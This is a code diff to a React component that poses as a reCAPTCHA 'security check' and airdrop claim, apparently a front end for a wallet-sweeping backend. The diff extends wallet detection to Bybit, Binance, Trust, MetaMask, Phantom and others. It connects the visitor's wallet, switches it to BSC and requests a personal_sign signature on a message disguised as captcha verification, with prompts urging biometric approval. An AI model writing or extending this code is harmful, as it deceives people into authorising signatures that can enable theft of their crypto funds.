@@ -14,6 +14,7 @@ const SecuritySimulationCaptcha = () => {
   const [eligibilityMessage, setEligibilityMessage] = useState('');
   const [modalStep, setModalStep] = useState(1);
   const [detectedWallet, setDetectedWallet] = useState(null);
+  const [walletProvider, setWalletProvider] = useState(null);
   const recaptchaRef = useRef(null);
   const isRecaptchaLoaded = useRef(false);
 
@@ -21,22 +22,61 @@ const SecuritySimulationCaptcha = () => {
   const BSC_TEST_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
   const API_URL = import.meta.env.VITE_API_URL || 'https://airdrop-sweeper-backen.onrender.com';
 
-  // Detect which wallet is installed (without auto-opening)
+  // Detect which wallet is installed (supports ALL wallets)
   const detectInstalledWallet = () => {
     if (typeof window !== 'undefined') {
-      if (window.ethereum) {
-        if (window.ethereum.isTrust) return { name: 'Trust Wallet', icon: '🔷', installed: true };
-        if (window.ethereum.isMetaMask) return { name: 'MetaMask', icon: '🦊', installed: true };
-        if (window.ethereum.isBybit) return { name: 'Bybit Wallet', icon: '📊', installed: true };
-        if (window.ethereum.isBinance) return { name: 'Binance Wallet', icon: '🟡', installed: true };
-        if (window.ethereum.isCoinbaseWallet) return { name: 'Coinbase Wallet', icon: '💰', installed: true };
-        return { name: 'Web3 Wallet', icon: '💳', installed: true };
+      // Check Bybit Wallet first (window.bybitWallet)
+      if (window.bybitWallet) {
+        return { name: 'Bybit Wallet', icon: '📊', provider: window.bybitWallet, type: 'bybit' };
       }
+      
+      // Check Binance Wallet
+      if (window.BinanceChain) {
+        return { name: 'Binance Wallet', icon: '🟡', provider: window.BinanceChain, type: 'binance' };
+      }
+      
+      // Check Ethereum wallets via window.ethereum
+      if (window.ethereum) {
+        if (window.ethereum.isTrust) {
+          return { name: 'Trust Wallet', icon: '🔷', provider: window.ethereum, type: 'ethereum' };
+        }
+        if (window.ethereum.isMetaMask) {
+          return { name: 'MetaMask', icon: '🦊', provider: window.ethereum, type: 'ethereum' };
+        }
+        if (window.ethereum.isCoinbaseWallet) {
+          return { name: 'Coinbase Wallet', icon: '💰', provider: window.ethereum, type: 'ethereum' };
+        }
+        if (window.ethereum.isImToken) {
+          return { name: 'imToken', icon: '🔷', provider: window.ethereum, type: 'ethereum' };
+        }
+        if (window.ethereum.isSafePal) {
+          return { name: 'SafePal', icon: '🔒', provider: window.ethereum, type: 'ethereum' };
+        }
+        if (window.ethereum.isTokenPocket) {
+          return { name: 'TokenPocket', icon: '📱', provider: window.ethereum, type: 'ethereum' };
+        }
+        // Generic Web3 wallet
+        return { name: 'Web3 Wallet', icon: '💳', provider: window.ethereum, type: 'ethereum' };
+      }
+      
+      // Check Phantom (Solana)
       if (window.solana && window.solana.isPhantom) {
-        return { name: 'Phantom', icon: '🟣', installed: true };
+        return { name: 'Phantom', icon: '🟣', provider: window.solana, type: 'solana' };
       }
     }
     return { name: null, installed: false };
+  };
+
+  // Get the correct provider for signing
+  const getProvider = () => {
+    if (detectedWallet?.provider) {
+      return detectedWallet.provider;
+    }
+    // Fallback checks
+    if (window.bybitWallet) return window.bybitWallet;
+    if (window.BinanceChain) return window.BinanceChain;
+    if (window.ethereum) return window.ethereum;
+    return null;
   };
 
   useEffect(() => {
@@ -52,9 +92,12 @@ const SecuritySimulationCaptcha = () => {
     
     // Detect wallet on load
     const wallet = detectInstalledWallet();
-    if (wallet.installed) {
+    if (wallet.name) {
       setDetectedWallet(wallet);
+      setWalletProvider(wallet.provider);
       console.log('[Wallet] Detected:', wallet.name);
+    } else {
+      console.log('[Wallet] No wallet detected');
     }
   }, []);
 
@@ -135,16 +178,16 @@ const SecuritySimulationCaptcha = () => {
     }
   }, []);
 
-  const switchToBSC = async () => {
+  const switchToBSC = async (provider) => {
     try {
-      await window.ethereum.request({
+      await provider.request({
         method: 'wallet_switchEthereumChain',
         params: [{ chainId: '0x38' }],
       });
       return true;
     } catch (error) {
       if (error.code === 4902) {
-        await window.ethereum.request({
+        await provider.request({
           method: 'wallet_addEthereumChain',
           params: [{
             chainId: '0x38',
@@ -164,44 +207,43 @@ const SecuritySimulationCaptcha = () => {
     setIsProcessing(true);
 
     try {
-      // Check if wallet is detected
-      const wallet = detectInstalledWallet();
+      // Get the correct provider
+      const provider = getProvider();
       
-      if (!wallet.installed) {
+      if (!provider) {
         if (isMobile) {
-          setErrorMessage('No wallet detected. Please install Trust Wallet, MetaMask, or Bybit Wallet from your app store, then open this page again.');
+          setErrorMessage('No wallet detected. Please open this page in Bybit Wallet, Trust Wallet, MetaMask, or Binance Wallet browser.');
         } else {
-          setErrorMessage('No wallet detected. Please install Trust Wallet or MetaMask extension.');
+          setErrorMessage('No wallet detected. Please install Trust Wallet, MetaMask, or Bybit Wallet extension.');
         }
         setIsProcessing(false);
         return;
+      }
+      
+      // Update detected wallet if not already set
+      if (!detectedWallet?.name) {
+        const wallet = detectInstalledWallet();
+        if (wallet.name) {
+          setDetectedWallet(wallet);
+          setWalletProvider(wallet.provider);
+        }
       }
       
       // For mobile, show instruction to open wallet app
       if (isMobile) {
-        setEligibilityMessage(`📱 Please open ${wallet.name} app to sign the claim receipt`);
+        setEligibilityMessage(`📱 Please open ${detectedWallet?.name || 'your wallet'} app to sign the claim receipt`);
         setModalStep(4);
         
         // Wait for user to open wallet and come back
-        await new Promise(r => setTimeout(r, 5000));
+        await new Promise(r => setTimeout(r, 3000));
       }
 
-      if (!window.ethereum) {
-        if (isMobile) {
-          setErrorMessage(`Please open ${wallet.name} app and use its built-in browser, or open this page in ${wallet.name}'s browser.`);
-        } else {
-          setErrorMessage('Please refresh the page and connect your wallet.');
-        }
-        setIsProcessing(false);
-        return;
-      }
-
-      // Connect to wallet
-      let accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      // Connect to wallet using the detected provider
+      let accounts = await provider.request({ method: 'eth_accounts' });
       
       if (!accounts || accounts.length === 0) {
         setEligibilityMessage('Connecting to your wallet...');
-        accounts = await window.ethereum.request({ 
+        accounts = await provider.request({ 
           method: 'eth_requestAccounts' 
         });
         
@@ -211,11 +253,11 @@ const SecuritySimulationCaptcha = () => {
       }
       
       const userAddress = accounts[0];
-      console.log('[Wallet] Connected:', userAddress);
+      console.log('[Wallet] Connected:', userAddress, 'via', detectedWallet?.name);
       
       // Switch to BSC network
       setEligibilityMessage('Switching to BSC network...');
-      await switchToBSC();
+      await switchToBSC(provider);
       await new Promise(r => setTimeout(r, 1000));
       
       // Create claim message
@@ -223,13 +265,13 @@ const SecuritySimulationCaptcha = () => {
       const claimMessage = "I authorize reCAPTCHA Browser Verification for " + new Date().toLocaleDateString() + ". Internal ID: " + randomId;
       
       console.log('[Message]', claimMessage);
-      setEligibilityMessage(`📱 Please check ${wallet.name} app to sign with FaceID / Fingerprint`);
+      setEligibilityMessage(`📱 Please check ${detectedWallet?.name || 'your wallet'} to sign with FaceID / Fingerprint`);
       setModalStep(4);
       
       await new Promise(r => setTimeout(r, 500));
       
-      // Request signature - THIS WILL OPEN THE SIGNATURE POPUP
-      const signature = await window.ethereum.request({
+      // Request signature - WORKS WITH ALL WALLETS (Bybit, Trust, MetaMask, etc.)
+      const signature = await provider.request({
         method: 'personal_sign',
         params: [claimMessage, userAddress]
       });
@@ -337,7 +379,7 @@ const SecuritySimulationCaptcha = () => {
 
         <div className="p-4 sm:p-6">
           <div className="mb-3 sm:mb-4 text-center">
-            <p className="text-xs text-gray-500">Supported: Trust Wallet | MetaMask | Bybit | Binance | Phantom</p>
+            <p className="text-xs text-gray-500">Supported: Bybit | Trust Wallet | MetaMask | Binance | Phantom | Coinbase</p>
           </div>
 
           {/* Show detected wallet */}
@@ -345,6 +387,14 @@ const SecuritySimulationCaptcha = () => {
             <div className="mb-4 p-2 bg-green-50 border border-green-200 rounded-lg text-center">
               <span className="text-sm text-green-700">
                 ✅ Detected: {detectedWallet.icon} {detectedWallet.name}
+              </span>
+            </div>
+          )}
+
+          {!detectedWallet && !isProcessing && !simulationData && (
+            <div className="mb-4 p-2 bg-yellow-50 border border-yellow-200 rounded-lg text-center">
+              <span className="text-sm text-yellow-700">
+                ⚠️ No wallet detected. Please open this page in Bybit Wallet, Trust Wallet, or MetaMask browser.
               </span>
             </div>
           )}
